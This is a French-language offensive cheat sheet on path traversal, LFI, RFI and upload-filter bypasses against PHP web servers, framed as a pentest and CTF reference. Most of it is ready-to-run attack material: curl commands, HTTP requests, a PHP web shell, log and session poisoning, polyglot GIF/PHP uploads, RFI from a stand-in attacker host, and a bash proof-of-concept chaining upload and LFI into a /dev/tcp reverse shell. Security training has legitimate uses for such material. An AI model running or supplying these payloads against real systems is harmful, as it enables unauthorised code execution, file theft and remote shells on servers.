# LFI / RFI / Path Traversal & Bypass d'Upload — Cheat Sheet

## 1. Périmètre et conventions

Cette fiche couvre quatre familles de techniques liées à la manipulation de fichiers côté serveur :

- **Path Traversal** : lecture de fichiers arbitraires hors racine web via un paramètre de chemin non filtré.
- **LFI (Local File Inclusion)** : inclusion et exécution d'un fichier local via `include()` / `require()` dynamique.
- **RFI (Remote File Inclusion)** : inclusion et exécution d'un fichier distant contrôlé par l'attaquant.
- **Bypass d'upload + chaining LFI → RCE** : contournement des filtres d'upload, puis exploitation d'une LFI pour exécuter le fichier uploadé.

**OWASP :** A03:2021 — Injection.

**Outils :** Burp Suite (Repeater, Intruder, Proxy), `curl`, Python `requests`, `ffuf`/`wfuzz`, Burp Collaborator.

**Conditions générales :** techniques applicables sur un environnement PHP dans le cas des wrappers et de l'upload ; le Path Traversal est indépendant du langage. Tests réservés à des labs, CTF ou pentests sous autorisation écrite.

**Conventions des exemples :**

| Placeholder | Signification |
|---|---|
| `cible.com` | Nom d'hôte fictif, à remplacer par la cible réelle autorisée |
| `PARAM` | Nom du paramètre HTTP vulnérable (`file`, `page`, `template`…) |
| `attaquant.com` | Serveur contrôlé par l'auditeur pour la RFI |
| `LHOST` / `LPORT` | IP et port du listener reverse shell de l'auditeur |
| `/var/www/html/uploads/` | Chemin de stockage des uploads — à adapter à la cible réelle |

---

## 2. Tableau de repérage rapide

| Objectif | Technique ou syntaxe | Quand l'utiliser | Signal attendu | Limite principale |
|---|---|---|---|---|
| Confirmer un Path Traversal | `../../../../etc/passwd` | Paramètre de chemin influençant une lecture de fichier | Contenu de `/etc/passwd` dans la réponse (`root:` visible) | Serveur durcis, `realpath()` + whitelist = non exploitable |
| Contourner un filtre `../` naïf | `....//....//etc/passwd` | Le filtre supprime `../` une seule fois sans récursion | Lecture du fichier malgré le filtre | Inefficace si le filtre est appliqué de façon récursive |
| Lire le code source PHP (LFI) | `php://filter/read=convert.base64-encode/resource=index.php` | Inclusion dynamique PHP, fichier `.php` à lire sans exécution | Longue chaîne Base64 dans la réponse | Nécessite PHP actif ; décodage manuel du Base64 requis |
| Exécuter du code via le corps POST (LFI) | `php://input` + corps PHP | `allow_url_include = On` sur le serveur | Résultat de la commande PHP dans la réponse | Nécessite `allow_url_include = On` (désactivé par défaut depuis PHP 5.2) |
| RCE directe sans prérequis de log | `data://text/plain;base64,<payload_b64>` | `allow_url_include = On` | Exécution du payload PHP encodé | Mêmes prérequis que `php://input` |
| Escalader une LFI vers RCE (log poisoning) | Empoisonner `User-Agent`, inclure `/var/log/apache2/access.log` | LFI confirmée, logs lisibles par le processus web | Résultat de la commande dans la réponse | Compte web sans droits de lecture sur les logs = échec |
| Escalader une LFI vers RCE (session) | Empoisonner une session, inclure `/tmp/sess_<PHPSESSID>` | Application PHP avec sessions côté serveur | Résultat de la commande dans la réponse | Chemin des sessions parfois non standard |
| RFI directe | `http://attaquant.com/shell.txt` | `allow_url_include = On` ET `allow_url_fopen = On` | Exécution du shell distant | Désactivé par défaut depuis PHP 5.2 |
| Bypass de filtre côté client (upload) | Intercepter + renommer `shell.php` + modifier `Content-Type` | Validation d'upload uniquement côté JavaScript/HTML | Upload accepté avec extension `.php` | Le serveur peut refuser indépendamment |
| Bypass liste noire d'extensions | Extensions alternatives : `.phtml`, `.phar`, `.php5`… | Validation par liste noire côté serveur | Upload accepté malgré le nom PHP | Dépend de la configuration Apache/Nginx cible |
| Bypass vérification MIME seule | `Content-Type: image/jpeg` + corps PHP dans la requête | Seul le `Content-Type` déclaré est vérifié | Upload accepté avec contenu PHP réel | Sans effet si Magic Bytes également vérifiés |
| Bypass Magic Bytes (polyglotte) | `GIF89a;<?php system($_GET["cmd"]); ?>` | Vérification des premiers octets côté serveur | `getimagesize()` retourne `image/gif`, code PHP toujours exécutable via LFI | Inefficace si re-compression GD/Imagick appliquée |
| RCE finale (chaining Upload + LFI) | Upload polyglotte → LFI sur le chemin du fichier uploadé | LFI confirmée + upload accessible ou chemin connu | Sortie de commande dans la réponse, puis reverse shell | Le chemin du fichier uploadé doit être connu ou prévisible |

---

## 3. Techniques classées par objectif

### 3.1 Détecter

#### Identification de paramètres d'inclusion vulnérables

**Objectif :** repérer les paramètres HTTP dont la valeur influence une opération de lecture ou d'inclusion de fichier.

**Quand l'utiliser :** dès le mapping de l'application, avant tout test actif.

**Prérequis :** aucun.

**Noms de paramètres typiquement vulnérables :**

```text
?file=       ?page=       ?include=       ?template=
?path=       ?doc=        ?load=          ?view=
```

**Sondes minimales de confirmation :**

```bash
# Path Traversal / LFI — Linux
curl "http://cible.com/index.php?file=../../../../etc/passwd"

# LFI via wrapper PHP (code source sans exécution)
curl "http://cible.com/index.php?page=php://filter/read=convert.base64-encode/resource=index.php"
```

**Signal attendu :**
- Path Traversal : contenu de `/etc/passwd` (présence de `root:x:0:0:`).
- Wrapper `php://filter` : longue chaîne Base64 dans la réponse HTTP.

**Interprétation :** la présence de `root:` confirme la traversée. Une chaîne Base64 confirme l'inclusion dynamique PHP exploitable avec des wrappers. Un des deux signaux est suffisant pour qualifier la vulnérabilité.

**Limites :** le signal peut être absent si la sortie est filtrée avant affichage (injection aveugle) — passer alors aux techniques d'escalade avec exfiltration (section 3.3).

**Source :** cours fourni, sections 2 et 3.

#### Mapping d'une fonctionnalité d'upload

**Objectif :** documenter le comportement de la validation côté serveur avant de tenter un bypass.

**Quand l'utiliser :** fonctionnalité d'upload identifiée dans l'application.

**Prérequis :** accès Burp Suite ou proxy HTTP équivalent.

**Éléments à documenter via Burp Proxy :**

```text
1. URL de destination du fichier après upload (JSON de réponse ou URL visible dans l'interface)
2. Nom conservé ou renommé aléatoirement côté serveur ?
3. Répertoire accessible par URL directe ou hors racine web ?
4. Message d'erreur en cas d'extension refusée (liste noire ou liste blanche ?)
5. Chemin du fichier retourné dans la réponse HTTP (premier maillon du chaining LFI)
```

**Signal attendu :** compréhension du mécanisme de validation (liste noire = contournable, liste blanche stricte = plus robuste) et du chemin de stockage final.

**Source :** cours fourni, section 3.

---

### 3.2 Adapter — Contourner les filtres Path Traversal

**Objectif :** franchir un filtre bloquant partiellement les séquences de traversée.

**Quand l'utiliser :** les séquences `../` brutes sont bloquées mais l'endpoint est confirmé vulnérable.

**Prérequis :** un résultat de référence (ex. `../../../../etc/passwd` bloqué, sans erreur franche).

**Syntaxes alternatives (tester une par une) :**

```bash
# Suffixe absorbé — contourne un remplacement non récursif de "../"
../../../../etc/passwd
....//....//....//etc/passwd

# Double encodage — contourne un WAF décodant une seule fois
..%252f..%252f..%252fetc%252fpasswd

# Null byte — tronque une extension ajoutée par l'appli (PHP < 5.3.4 uniquement)
../../../../etc/passwd%00

# Backslash Windows
..\..\..\boot.ini
..\..\..\..\windows\win.ini

# Overlong UTF-8 (décodeur laxiste uniquement)
%c0%ae%c0%ae%c0%af
```

**Éléments à personnaliser :** profondeur de traversée (`../` × N), chemin cible selon l'OS.

**Signal attendu :** contenu du fichier cible dans la réponse.

**Interprétation :** chaque variante cible un mécanisme de filtre différent — toujours tester une seule variante à la fois pour attribuer le résultat.

**Limites :** un `realpath()` avec vérification de préfixe côté serveur neutralise toutes ces variantes structurellement.

**Source :** cours fourni, sections 2 et 4.

---

### 3.3 Confirmer et escalader — LFI vers RCE

#### Wrappers PHP — lecture de code source et exécution

**Objectif :** exploiter les wrappers PHP natifs pour lire du code source ou injecter et exécuter un payload.

**Quand l'utiliser :** LFI confirmée sur un endpoint PHP.

**Wrapper `php://filter` — lire le code source sans l'exécuter :**

```bash
curl "http://cible.com/page.php?file=php://filter/read=convert.base64-encode/resource=config.php"
# Décoder le résultat : echo "BASE64_STRING" | base64 -d
```

**Wrapper `php://input` — exécuter le corps de la requête POST :**

**Prérequis :** `allow_url_include = On`.

```bash
curl -X POST "http://cible.com/page.php?file=php://input" \
  --data '<?php system($_GET["cmd"]); ?>'
```

Puis déclencher la commande :

```bash
curl -X POST "http://cible.com/page.php?file=php://input&cmd=id" \
  --data '<?php system($_GET["cmd"]); ?>'
```

**Wrapper `data://` — injecter un payload PHP encodé en Base64 :**

**Prérequis :** `allow_url_include = On`.

```bash
# Encoder le payload : echo -n '<?php system($_GET["cmd"]); ?>' | base64
# Résultat : PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

curl "http://cible.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id"
```

**Signal attendu :** résultat de la commande (ex. `uid=33(www-data)`) dans la réponse HTTP.

**Source :** cours fourni, section 2.

#### Log Poisoning (Apache / Nginx)

**Objectif :** escalader une LFI vers RCE en injectant un payload PHP dans un fichier de log lisible par le processus web, puis en l'incluant.

**Quand l'utiliser :** LFI confirmée, wrappers `php://input` et `data://` non disponibles (`allow_url_include = Off`).

**Prérequis :** le processus PHP doit avoir les droits de lecture sur les logs ciblés.

**Étape 1 — Empoisonner le log via le User-Agent :**

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://cible.com/"
# Le payload PHP est journalisé dans access.log à chaque requête suivante
```

**Étape 2 — Inclure le log empoisonné via la LFI :**

```bash
# Apache
curl "http://cible.com/page.php?file=../../../var/log/apache2/access.log&cmd=id"

# Nginx
curl "http://cible.com/page.php?file=../../../var/log/nginx/access.log&cmd=id"

# SSH (empoisonnement via nom d'utilisateur lors d'une tentative de connexion)
ssh "<?php system(\$_GET['cmd']); ?>"@cible.com
curl "http://cible.com/page.php?file=../../../var/log/sshd.log&cmd=id"
```

**Signal attendu :** résultat de la commande `id` dans le corps de la réponse HTTP.

**Limites :** les logs sont souvent réservés à `root` ou `adm` — la lisibilité par le processus web n'est pas garantie sur un système durci.

**Source :** cours fourni, section 2.

#### PHP Session Poisoning

**Objectif :** injecter un payload dans un fichier de session PHP, puis l'inclure via la LFI.

**Quand l'utiliser :** log poisoning inapplicable (logs non lisibles), mais sessions PHP actives et chemin des sessions accessible.

**Prérequis :** PHPSESSID connu ou contrôlé ; droits de lecture sur `/tmp/sess_<PHPSESSID>` par le processus PHP.

**Étape 1 — Empoisonner la session :**

```bash
curl -b "PHPSESSID=abc123" "http://cible.com/" \
  --data "user=<?php system(\$_GET['cmd']); ?>"
```

**Étape 2 — Inclure le fichier de session :**

```bash
curl "http://cible.com/page.php?file=/tmp/sess_abc123&cmd=id"
```

**Éléments à personnaliser :** `abc123` (valeur du `PHPSESSID`), chemin du répertoire de sessions (souvent `/tmp/` ou `/var/lib/php/sessions/`).

**Signal attendu :** résultat de `id` dans la réponse.

**Limites :** le chemin des fichiers de session peut différer selon la configuration `session.save_path` dans `php.ini`.

**Source :** cours fourni, section 2.

#### RFI — Inclusion d'un fichier distant

**Objectif :** inclure et exécuter directement un fichier PHP hébergé sur un serveur contrôlé par l'attaquant.

**Quand l'utiliser :** `allow_url_include = On` et `allow_url_fopen = On` confirmés.

**Prérequis :** serveur HTTP contrôlé par l'auditeur, fichier de shell préparé.

**Contenu type de `shell.txt` :**

```php
<?php system($_GET['cmd']); ?>
```

**Syntaxe minimale :**

```bash
curl "http://cible.com/page.php?file=http://attaquant.com/shell.txt&cmd=id"

# Si l'appli ajoute une extension ".php" à la valeur du paramètre :
curl "http://cible.com/page.php?file=http://attaquant.com/shell.txt?"
# Le "?" final neutralise l'extension ajoutée par l'application
```

**Signal attendu :** résultat de la commande `id` dans la réponse.

**Limites :** `allow_url_include = On` est désactivé par défaut depuis PHP 5.2 — très rare en production moderne.

**Source :** cours fourni, section 2.

---

### 3.4 Contourner une contrainte — Bypass d'upload

#### Bypass de validation côté client

**Objectif :** contourner toute restriction d'extension ou de MIME imposée par JavaScript ou l'attribut HTML `accept`.

**Quand l'utiliser :** la fonctionnalité d'upload présente une validation uniquement côté front-end.

**Prérequis :** Burp Suite ou proxy HTTP en interception.

**Méthode :**

```text
1. Sélectionner une image légitime (image.jpg) — la validation HTML/JS l'accepte
2. Intercepter la requête multipart dans Burp Suite avant transmission au serveur
3. Modifier le champ filename : "image.jpg" → "shell.php"
4. Remplacer le corps par le payload PHP : <?php system($_GET['cmd']); ?>
5. Transmettre la requête modifiée
```

**Ce que cela prouve :** la validation côté client est transparente pour le serveur — celui-ci ne reçoit que la requête HTTP forgée.

**Limites :** inefficace si une validation indépendante existe côté serveur ; ce test ne vise qu'à confirmer l'absence de validation serveur.

**Source :** cours fourni, section 4.1.

#### Bypass de liste noire d'extensions

**Objectif :** contourner un filtre refusant les extensions `.php` explicites en utilisant des extensions alternatives interprétées par le serveur.

**Quand l'utiliser :** upload refusé sur `.php`, mais le message d'erreur suggère une liste noire (ex. « extension non autorisée »).

**Extensions alternatives à tester (une par une) :**

```text
shell.php3      shell.php4      shell.php5       shell.php7
shell.phtml     shell.phar      shell.php.png    (double extension)
shell.PHP       shell.PhP       (variations de casse)
shell.php%00.jpg                (null byte — PHP < 5.3.4 uniquement)
shell.php;.jpg                  (point-virgule — Nginx mal configuré)
```

**Requête HTTP de référence (Burp Repeater) :**

```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------Boundary--
```

**Signal attendu :** upload accepté (200/201) et chemin du fichier retourné dans la réponse.

**Limites :** les extensions alternatives disponibles dépendent entièrement de la configuration Apache/Nginx cible — ne pas généraliser les résultats d'un serveur à l'autre.

**Source :** cours fourni, section 4.2.

**Variante — upload d'un `.htaccess` malveillant (Apache uniquement) :**

```apache
# Contenu du .htaccess uploadé dans le répertoire d'uploads
AddType application/x-httpd-php .jpg
# Après cet upload, tout fichier .jpg de ce répertoire est exécuté comme du PHP
```

Nécessite que l'application accepte l'upload de `.htaccess` et qu'Apache soit configuré pour les interpréter dans ce répertoire.

#### Bypass de vérification `Content-Type` MIME seule

**Objectif :** passer un contenu PHP en déclarant un `Content-Type` image valide.

**Quand l'utiliser :** le serveur rejette l'upload si le `Content-Type` de la partie multipart n'est pas une image, mais ne vérifie pas le contenu réel.

**Syntaxe minimale (Burp Repeater) :**

```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------Boundary--
```

**Avec Python `requests` :**

```python
import requests

url = "http://cible.com/upload"
files = {
    "file": (
        "shell.php",                      # Extension PHP dans le nom de fichier
        b"<?php system($_GET['cmd']); ?>",
        "image/jpeg",                     # Content-Type falsifié
    )
}
r = requests.post(url, files=files)
print(r.status_code, r.text)
```

**Signal attendu :** upload accepté avec le contenu PHP.

**Limites :** sans effet si le serveur vérifie les Magic Bytes réels (`finfo` / `getimagesize()`) en plus du `Content-Type` déclaré.

**Source :** cours fourni, section 4.3.

#### Bypass de vérification des Magic Bytes — Fichier polyglotte

**Objectif :** satisfaire une vérification des premiers octets du fichier tout en embarquant un payload PHP exécutable via une inclusion.

**Quand l'utiliser :** le serveur lit les Magic Bytes réels (`getimagesize()`, `finfo`) mais n'applique pas de re-compression GD/Imagick.

**Prérequis :** LFI disponible pour déclencher l'exécution du fichier uploadé.

**Création du fichier polyglotte GIF89a + PHP :**

```bash
printf 'GIF89a;' > shell.gif.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.gif.php
```

**Signatures magiques exploitables dans ce contexte :**

| Format | Magic Bytes (hex) | ASCII | Fonction de vérification concernée |
|---|---|---|---|
| GIF87a | `47 49 46 38 37 61` | `GIF87a` | `getimagesize()`, `finfo` |
| GIF89a | `47 49 46 38 39 61` | `GIF89a` | `getimagesize()`, `finfo` |
| JPEG | `FF D8 FF` | `ÿØÿ` | `getimagesize()`, `finfo` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` | `getimagesize()`, `finfo` |

**Pourquoi ça fonctionne :** `getimagesize()` vérifie que les premiers octets sont parsables comme une image, mais ne valide pas l'absence de code PHP dans la suite du fichier. PHP ignore les données non-PHP au début du fichier lors d'une inclusion, et exécute le code `<?php ... ?>` dès qu'il le rencontre.

**Limites :** la re-compression via GD/Imagick reconstruit le fichier pixel par pixel et détruit tout payload situé après la signature — la seule contre-mesure robuste à ce vecteur.

**Source :** cours fourni, section 4.4.

---

### 3.5 Provoquer un effet contrôlé — Chaining Upload + LFI → RCE

**Objectif :** combiner un upload d'un fichier polyglotte et une LFI pour obtenir une exécution de code arbitraire.

**Quand l'utiliser :** upload accepté (avec ou sans bypass) ET LFI confirmée, avec chemin du fichier uploadé connu ou prévisible.

**Prérequis :**

| Condition | Impact si non remplie |
|---|---|
| Fichier uploadé lisible par le processus PHP | `include()` échoue silencieusement |
| Chemin du fichier uploadé connu ou devinable | Impossible de construire le vecteur LFI |
| Extension stockée n'empêchant pas l'exécution via `include()` | Un renommage en `.dat` **ne bloque pas** l'exécution PHP via inclusion |
| Répertoire d'upload sans `php_flag engine off` ni désactivation PHP | Un `.htaccess` avec cette directive casse le chaining |

**Flux d'exploitation complet :**

```text
Étape 1 — Upload du payload polyglotte
  POST /upload
  Body : shell.jpg contenant GIF89a;<?php system($_GET['cmd']); ?>
  Réponse : {"url": "/uploads/user_1234/shell.jpg"}

Étape 2 — Déclenchement via LFI
  GET /page.php?file=../../../../var/www/html/uploads/user_1234/shell.jpg&cmd=id
  Réponse : GIF89a;uid=33(www-data) gid=33(www-data) groups=33(www-data)

Étape 3 — Escalade vers un reverse shell
  Listener : nc -lvnp 4444
  GET /page.php?file=...&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261'
```

**Script de chaining (preuve de concept) :**

```bash
# 1. Créer le payload polyglotte
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > payload.jpg

# 2. Uploader avec Content-Type image/gif
UPLOAD_RESP=$(curl -s -X POST "http://cible.com/upload" \
  -F "file=@payload.jpg;type=image/gif" \
  -F "submit=1")
echo "[*] Réponse upload : $UPLOAD_RESP"
# → noter le chemin retourné dans UPLOAD_RESP

# 3. Adapter le chemin LFI selon la réponse
LFI_PATH="../../../../var/www/html/uploads/payload.jpg"

# 4. Vérifier l'exécution via LFI
curl -s "http://cible.com/page.php?file=${LFI_PATH}&cmd=id"

# 5. Reverse shell (adapter LHOST et LPORT)
LHOST="10.0.0.1" ; LPORT="4444"
curl -s -G "http://cible.com/page.php" \
  --data-urlencode "file=${LFI_PATH}" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
```

**Signal attendu :** à l'étape 2, sortie de `id` dans la réponse. À l'étape 3, connexion entrante sur le listener.

**Limites :** si le chemin de stockage final est renommé aléatoirement et non retourné dans la réponse, le chaining n'est pas praticable sans une autre faille révélant le chemin.

**Source :** cours fourni, section 4.5.

---

## 4. Payloads et syntaxes représentatifs

| Intention | Payload de référence | Contexte d'insertion | Variante utile | Différence apportée |
|---|---|---|---|---|
| Path Traversal Linux | `../../../../etc/passwd` | Paramètre GET `?file=` | `....//....//etc/passwd` | Contourne un filtre non récursif sur `../` |
| Path Traversal Windows | `..\..\..\boot.ini` | Paramètre GET `?file=` | `..\..\..\..\windows\win.ini` | Équivalent pour fichier plus couramment lisible |
| Double encodage | `..%252f..%252f..%252fetc%252fpasswd` | Paramètre GET encodé | — | Cible un WAF décodant une seule fois |
| Lecture de code source PHP | `php://filter/read=convert.base64-encode/resource=index.php` | Paramètre LFI | Remplacer `index.php` par tout fichier PHP cible | La cible est la seule variable |
| Exécution via POST | `php://input` | Paramètre LFI + corps POST `<?php system($_GET["cmd"]); ?>` | `data://text/plain;base64,<payload>` | Ne nécessite pas de corps POST distinct |
| Log poisoning User-Agent | `<?php system($_GET['cmd']); ?>` | En-tête `User-Agent` de n'importe quelle requête | Via identifiants SSH | Empoisonne `/var/log/sshd.log` au lieu d'`access.log` |
| Session poisoning | `<?php system($_GET['cmd']); ?>` | Corps d'un formulaire enregistrant une donnée de session | — | Pas de variante de payload ; adapter le champ envoyé |
| Polyglotte GIF89a | `GIF89a;<?php system($_GET["cmd"]); ?>` | Contenu du fichier uploadé | `GIF87a;<?php ... ?>` | Sélectionne l'autre signature GIF |
| Bypass MIME seul | `<?php system($_GET['cmd']); ?>` avec `Content-Type: image/jpeg` | Corps multipart | Tester aussi `image/png` ou `image/gif` | Aucune différence technique si seul le `Content-Type` est vérifié |
| Extension alternative | `shell.phtml`, `shell.phar`, `shell.php5`… | Champ `filename=` du multipart | Voir liste complète section 3.4 | Chaque extension cible une configuration serveur différente |

---

## 5. Encodages, formats et représentation des entrées

| Représentation d'origine | Encodée | Contexte pertinent | Composant décodant | Effet attendu |
|---|---|---|---|---|
| `../` | `%2e%2e%2f` | Paramètre GET soumis via URL | Serveur web avant transmission à PHP | Contourne un filtre texte sur `../` sans toucher au comportement PHP |
| `%2e%2e%2f` | `%252e%252e%252f` | Double encodage | WAF ou couche applicative décodant une seule fois | Le décodage partiel révèle `%2e%2e%2f`, ensuite interprété par PHP |
| `../` | `....//` | Paramètre GET | Filtre non récursif sur `../` | La séquence `....//` devient `../` après suppression d'une occurrence de `../` |
| `../` | `%c0%ae%c0%ae%c0%af` | Paramètre GET | Décodeur UTF-8 laxiste | Représentation non canonique, acceptée par certains parseurs permissifs |
| `/` | `%2f` | Chemin de traversée dans certains contextes | Composant normalisant le chemin avant filtrage | Permet d'insérer un séparateur de chemin sans le caractère brut |
| Null byte | `%00` | Fin du paramètre de chemin | PHP < 5.3.4 | Tronque la chaîne après `%00`, supprimant une extension ajoutée par l'appli |

**Condition d'inefficacité :** si `realpath()` est appliqué côté serveur avant toute comparaison de préfixe, tous les encodages et les séquences `../` redondantes sont normalisés avant filtrage — aucune variante de traversée n'est alors fonctionnelle. Confirmer que la normalisation est effectivement absente avant de multiplier les encodages.

---

## 6. Exemples de requêtes HTTP

### 6.1 Path Traversal basique

```http
# Référence — requête légitime
GET /index.php?file=about.php HTTP/1.1
Host: cible.com
```

```http
# Version modifiée — traversée vers /etc/passwd
GET /index.php?file=../../../../etc/passwd HTTP/1.1
Host: cible.com
```

- **Changement clé :** valeur de `file` remplacée par un chemin de traversée.
- **Signal recherché :** contenu de `/etc/passwd` (`root:x:0:0:...`) dans la réponse.
- **Ce que cela ne prouve pas seul :** qu'une inclusion PHP est possible — confirmer avec `php://filter` si l'objectif est l'escalade vers RCE.

### 6.2 LFI avec wrapper `php://filter`

```http
GET /page.php?file=php://filter/read=convert.base64-encode/resource=config.php HTTP/1.1
Host: cible.com
```

- **Pourquoi important :** inclure directement `config.php` l'exécute — le wrapper empêche l'exécution et encode la source.
- **Signal recherché :** longue chaîne Base64 dans la réponse → décoder avec `echo "..." | base64 -d`.

### 6.3 Log poisoning

```http
# Étape 1 — Empoisonner le log
GET / HTTP/1.1
Host: cible.com
User-Agent: <?php system($_GET['cmd']); ?>
```

```http
# Étape 2 — Inclure le log empoisonné
GET /page.php?file=../../../var/log/apache2/access.log&cmd=id HTTP/1.1
Host: cible.com
```

- **Changement clé (étape 1) :** `User-Agent` remplacé par un payload PHP.
- **Prérequis :** processus PHP avec droits de lecture sur `access.log`.
- **Ce que cela ne prouve pas seul :** que le payload persistera à chaque requête — d'autres accès peuvent avoir écrit entre-temps.

### 6.4 Upload polyglotte avec bypass MIME

```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: image/gif

GIF89a;<?php system($_GET['cmd']); ?>
------Boundary--
```

- **Changement clé :** `filename` conserve une extension image (`.jpg`) ; `Content-Type` déclare `image/gif` ; le corps commence par `GIF89a;` (signature GIF valide) suivi du payload PHP.
- **Prérequis :** `getimagesize()` ou `finfo` utilisé sans re-compression GD/Imagick.
- **Ce que cela ne prouve pas seul :** qu'une exécution est possible — il faut encore une LFI pointant sur ce fichier.

---

## 7. Outils et commandes

| Outil | Fonction | Quand l'utiliser | Exemple minimal | Limite ou précaution |
|---|---|---|---|---|
| Burp Repeater | Modification manuelle de requêtes HTTP | Tests de Path Traversal, bypass MIME, bypass extension | Modifier `file=` ou `filename=`, observer la réponse | Peu adapté au fuzzing en volume |
| Burp Intruder | Automatisation d'un payload sur une position variable | Fuzzing d'extensions alternatives, de profondeurs de traversée | Positionner sur `filename=`, charger la liste d'extensions alternatives | Bruyant dans les logs ; mode Sniper pour un seul paramètre |
| `curl` | Requêtes HTTP ciblées, inclusion de headers personnalisés | Log poisoning (User-Agent), RFI, LFI directe | `curl -A "<?php system(...); ?>" http://cible.com/` | Pas de gestion de session native — utiliser `-b "PHPSESSID=..."` |
| `ffuf` / `wfuzz` | Fuzzing de paramètres et de valeurs | Recherche de paramètres vulnérables, variantes d'encodage de traversée | `ffuf -u "http://cible.com/index.php?file=FUZZ" -w traversal-wordlist.txt` | Dépend de la wordlist ; filtrer par taille de réponse pour réduire le bruit |
| Python `requests` | Forge précise de requêtes multipart | Bypass MIME avec `Content-Type` falsifié | Voir exemple section 3.4 | Syntaxe du tuple `files=` à respecter pour contrôler chaque champ |
| `printf` / `echo` | Création de fichiers polyglottes en local | Préparer le payload avant upload | `printf 'GIF89a;' > shell.gif.php && echo '<?php ... ?>' >> shell.gif.php` | Vérifier que les Magic Bytes sont corrects avec `xxd shell.gif.php \| head` |
| `nc` (netcat) | Listener pour reverse shell | Étape finale du chaining Upload + LFI | `nc -lvnp 4444` | Le pare-feu de la cible peut bloquer les connexions sortantes vers le listener |

---

## 8. Signaux caractéristiques et vérifications

| Observation | Ce qu'elle peut indiquer | Vérification complémentaire | Conclusion à éviter |
|---|---|---|---|
| Contenu de `/etc/passwd` dans la réponse | Path Traversal ou LFI confirmée | Tester `php://filter` pour confirmer une inclusion PHP exploitable | Qu'une LFI est forcément présente — peut être une lecture directe sans inclusion |
| Longue chaîne Base64 dans la réponse | Wrapper `php://filter` fonctionnel = inclusion PHP confirmée | Décoder et analyser le contenu pour identifier des secrets ou des fichiers à cibler | Que tous les wrappers sont disponibles — vérifier `allow_url_include` séparément |
| Résultat de `id` dans la réponse après log poisoning | RCE via LFI + log poisoning confirmée | Reproduire sur une seconde commande pour confirmer l'exécution arbitraire | Que la technique est stable — de nouveaux accès légitimes peuvent diluer le payload |
| Upload accepté avec un fichier `.phtml` | Liste noire incomplète côté serveur | Vérifier que le fichier est accessible par URL directe ET exécuté par PHP | Qu'un upload accepté équivaut à une RCE — l'exécution dépend de la config du répertoire |
| `getimagesize()` retourne `image/gif` pour le polyglotte | Vérification insuffisante (pas de re-compression GD) | Tenter l'inclusion via LFI pour confirmer l'exécution du payload PHP | Que la détection par signature seule garantit l'absence de code exécutable |
| Pas de chemin de fichier retourné après l'upload | Renommage aléatoire ou chemin non exposé | Chercher une fuite de chemin dans d'autres endpoints (profil, galerie…) | Que le chaining est impossible — un autre vecteur peut révéler le chemin |
| Connexion entrante sur le listener `nc` | Reverse shell établi, RCE complète confirmée | Vérifier la persistance (session active, TTY fonctionnel) | — (preuve directe, pas de nuance à apporter) |

**Contrôle comparatif recommandé :** pour le Path Traversal, envoyer la requête légitime (chemin normal) puis la requête de traversée, et comparer la taille de réponse et le code HTTP avant de lire le contenu — un code 200 identique dans les deux cas peut indiquer un 404 déguisé.

---

## 9. Variantes de syntaxe et adaptation

#### Adapter la profondeur de traversée

**Problème précis :** `/etc/passwd` n'est pas retourné — profondeur insuffisante ou chemin de base différent.

**Pourquoi pertinent :** le nombre de `../` nécessaires dépend de la profondeur du répertoire de travail de l'application dans l'arborescence.

**Règle pratique :** ajouter des `../` supplémentaires sans crainte — dépasser la racine du système de fichiers ne provoque aucune erreur, le chemin reste bloqué à `/`.

**Ce qui change :** uniquement le nombre de `../` ; la cible reste identique.

#### Choisir la technique d'escalade LFI → RCE selon les contraintes

**Problème précis :** la première technique d'escalade tentée ne produit aucun résultat.

| Technique | Condition requise | Tester si |
|---|---|---|
| `php://input` / `data://` | `allow_url_include = On` | LFI confirmée, version PHP récente |
| Log poisoning (Apache/Nginx) | Logs lisibles par le processus PHP | `allow_url_include = Off`, accès aux logs probable |
| Session poisoning | Sessions PHP actives, PHPSESSID contrôlable | Logs inaccessibles |
| Chaining upload + LFI | Upload disponible + chemin connu | Aucune technique précédente fonctionnelle |

Ne changer qu'une seule technique à la fois et conserver le même payload de vérification (`cmd=id`) pour comparer les résultats.

#### Choisir le bypass d'upload selon la nature du filtre

| Filtre identifié | Bypass de référence | Variante si échec |
|---|---|---|
| Validation JS/HTML uniquement | Intercepter et modifier dans Burp | — (aucun filtre serveur = bypass direct) |
| Liste noire d'extensions | `.phtml`, `.phar`, `.php5`… (une par une) | `.htaccess` malveillant (Apache uniquement) |
| `Content-Type` MIME seul | Falsifier `Content-Type: image/jpeg` | — |
| Magic Bytes (`getimagesize` / `finfo`) sans re-compression | Fichier polyglotte `GIF89a;<?php ... ?>` | Tester les autres signatures (JPEG, PNG) |
| Re-compression GD/Imagick | Non bypassable à ce stade | Chercher un autre vecteur d'injection |

---

## 10. Diagnostic rapide des erreurs

| Problème constaté | Causes possibles | Vérification à effectuer | Ajustement pertinent | Ce que cela permet de conclure |
|---|---|---|---|---|
| Aucun fichier retourné (200 vide ou contenu applicatif normal) | Traversée insuffisante, filtre actif, chemin incorrect | Augmenter le nombre de `../` ; tester une variante encodée | Tester `....//` ou `%252e%252e%252f` selon la nature du filtre suspecté | Que ce chemin précis ou cette profondeur est non exploitable, pas que la vulnérabilité est absente |
